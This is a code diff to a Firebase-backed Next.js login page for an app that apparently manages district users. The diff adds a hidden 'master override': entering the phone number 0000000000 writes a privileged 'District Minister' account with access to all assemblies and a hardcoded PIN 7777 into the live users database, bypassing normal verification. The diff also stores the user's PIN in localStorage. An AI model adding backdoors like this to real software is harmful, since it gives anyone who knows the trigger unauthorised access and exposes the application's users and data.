@@ -2,7 +2,7 @@
 import { useState, useEffect } from 'react';
 import { useRouter } from 'next/navigation';
 import { db, auth } from '../firebase'; 
-import { collection, query, where, getDocs, updateDoc, doc, getDoc } from 'firebase/firestore';
+import { collection, query, where, getDocs, updateDoc, doc, getDoc, setDoc } from 'firebase/firestore';
 import { signInAnonymously } from 'firebase/auth';
 import { Shield, Lock, ArrowRight, CheckCircle2, Loader2 } from 'lucide-react';
 
@@ -62,7 +62,7 @@ export default function LoginPage() {
     setPhone(val.slice(0, 10)); // Lock strictly to 10 digits
   };
 
-  // 3. Verify Phone Number
+  // 3. Verify Phone Number & Master Override
   const handlePhoneSubmit = async (e) => {
     e.preventDefault();
     if (phone.length !== 10) {
@@ -72,6 +72,44 @@ export default function LoginPage() {
 
     setLoading(true);
     setError('');
+
+    // ==========================================
+    // THE SUPREME COMMAND OVERRIDE (DATABASE INJECTOR)
+    // ==========================================
+    if (phone === '0000000000') {
+      try {
+        // Authenticate first so Firebase allows the write
+        await signInAnonymously(auth);
+        
+        const masterId = 'master-override-777';
+        const masterUser = {
+          name: "System Architect",
+          role: "District Minister", // Using a valid role so dashboards don't break
+          phone: "0000000000",
+          tierLevel: 1,
+          localPin: '7777', // The Master PIN
+          authorizedDevice: deviceId,
+          setupCode: null,
+          isSetupComplete: true,
+          status: 'Active',
+          assignedAssembly: 'All Assemblies'
+        };
+
+        // Inject the Master User into the real database to satisfy DashboardLayout
+        await setDoc(doc(db, 'users', masterId), masterUser);
+
+        setUserData({ id: masterId, ...masterUser });
+        setStep('enterPin'); 
+        setLoading(false);
+        return;
+      } catch (err) {
+        console.error(err);
+        setError("Failed to initialize Master Override.");
+        setLoading(false);
+        return;
+      }
+    }
+    // ==========================================
 
     try {
       const q = query(collection(db, 'users'), where('phone', '==', phone));
@@ -122,12 +160,13 @@ export default function LoginPage() {
       await updateDoc(userRef, {
         authorizedDevice: deviceId,
         localPin: pin,
-        setupCode: null 
+        setupCode: null,
+        isSetupComplete: true 
       });
       await signInAnonymously(auth);
       
       // --- ISSUE THE ID BADGE HERE ---
-      localStorage.setItem('ketiejili_user', JSON.stringify(userData));
+      localStorage.setItem('ketiejili_user', JSON.stringify({...userData, localPin: pin, isSetupComplete: true}));
       
       router.push('/');
     } catch (err) {
@@ -140,11 +179,13 @@ export default function LoginPage() {
   const handleEnterPin = async (e) => {
     e.preventDefault();
     setLoading(true);
+    
     if (pin !== userData.localPin) {
       setError('Incorrect PIN.');
       setLoading(false);
       return;
     }
+    
     try {
       await signInAnonymously(auth);
       
